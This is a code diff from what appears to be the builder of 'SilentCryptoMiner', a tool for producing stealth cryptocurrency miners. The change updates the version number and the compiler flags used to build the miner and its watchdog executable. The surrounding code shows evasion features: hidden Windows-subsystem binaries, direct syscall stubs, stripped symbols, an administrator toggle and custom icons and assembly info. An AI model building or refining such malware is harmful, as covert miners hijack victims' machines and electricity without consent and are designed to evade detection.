@@ -46,7 +46,7 @@ namespace SilentCryptoMiner
         public string UNAMKEY = "UXUUXUUXUUCommandULineUUXUUXUUXU";
         public string UNAMIV = "UUCommandULineUU";
 
-        public string builderVersion = "3.3.0";
+        public string builderVersion = "3.3.1";
 
         private void Form1_Load(object sender, EventArgs e)
         {
@@ -280,7 +280,7 @@ namespace SilentCryptoMiner
                     BuildLog("Compiling Watchdog...");
                     string watchdogpath = savePathBase + "-watchdog.exe";
                     string watchdogcode = Properties.Resources.watchdog.Replace("$WATCHDOGSET", string.Join(",", watchdogSet)).Replace("$MINERCOUNT", watchdogSet.Count.ToString());
-                    if (Codedom.NativeCompiler(watchdogpath, watchdogcode, $"g++.exe -m64 -Wl,-subsystem,windows -mwindows \"{savePathBase}-watchdog.cpp\" \"{currentDirectory}\\UFiles\\*.cpp\" \"{currentDirectory}\\UFiles\\Syscalls\\*.c\" \"{currentDirectory}\\UFiles\\Syscalls\\syscallsstubs.std.x64.s\" -Os -D__USE_MINGW_ANSI_STDIO=0 -static-libgcc -static-libstdc++ -fno-threadsafe-statics -s -o \"{watchdogpath}\"", "", false, toggleAdministrator.Checked))
+                    if (Codedom.NativeCompiler(watchdogpath, watchdogcode, $"-m64 -Wl,-subsystem,windows -mwindows \"{savePathBase}-watchdog.cpp\" \"{currentDirectory}\\UFiles\\*.cpp\" \"{currentDirectory}\\UFiles\\Syscalls\\*.c\" \"{currentDirectory}\\UFiles\\Syscalls\\syscallsstubs.std.x64.s\" -O3 -D__USE_MINGW_ANSI_STDIO=0 -static-libgcc -static-libstdc++ -fno-threadsafe-statics -s -o \"{watchdogpath}\"", "", false, toggleAdministrator.Checked))
                     {
                         watchdogdata = File.ReadAllBytes(watchdogpath);
                         File.Delete(watchdogpath);
@@ -317,7 +317,7 @@ namespace SilentCryptoMiner
                 minerbuilder.Replace("$RESOURCES", resources.ToString());
 
                 BuildLog("Compiling Miner...");
-                if (Codedom.NativeCompiler(savePathBase + ".exe", minerbuilder.ToString(), $"g++.exe -m64 -Wl,-subsystem,windows -mwindows \"{savePathBase}.cpp\" \"{currentDirectory}\\UFiles\\*.cpp\" \"{currentDirectory}\\UFiles\\Syscalls\\*.c\" \"{currentDirectory}\\UFiles\\Syscalls\\syscallsstubs.std.x64.s\" \"{currentDirectory}\\resource.o\" -Os -D__USE_MINGW_ANSI_STDIO=0 -static-libgcc -static-libstdc++ -fno-stack-protector -fno-threadsafe-statics -fvisibility=hidden -Wl,--strip-all -s -o \"{savePathBase + ".exe"}\"", (chkIcon.Checked && txtIconPath.Text != "" ? txtIconPath.Text : null), chkAssembly.Checked, toggleAdministrator.Checked))
+                if (Codedom.NativeCompiler(savePathBase + ".exe", minerbuilder.ToString(), $"-m64 -Wl,-subsystem,windows -mwindows \"{savePathBase}.cpp\" \"{currentDirectory}\\UFiles\\*.cpp\" \"{currentDirectory}\\UFiles\\Syscalls\\*.c\" \"{currentDirectory}\\UFiles\\Syscalls\\syscallsstubs.std.x64.s\" \"{currentDirectory}\\resource.o\" -O3 -D__USE_MINGW_ANSI_STDIO=0 -static-libgcc -static-libstdc++ -fno-stack-protector -fno-threadsafe-statics -fvisibility=hidden -Wl,--strip-all -s -o \"{savePathBase + ".exe"}\"", (chkIcon.Checked && txtIconPath.Text != "" ? txtIconPath.Text : null), chkAssembly.Checked, toggleAdministrator.Checked))
                 {
                     BuildLog("Compiling Uninstaller...");
                     Codedom.UninstallerCompiler(savePathBase + "-uninstaller.exe");
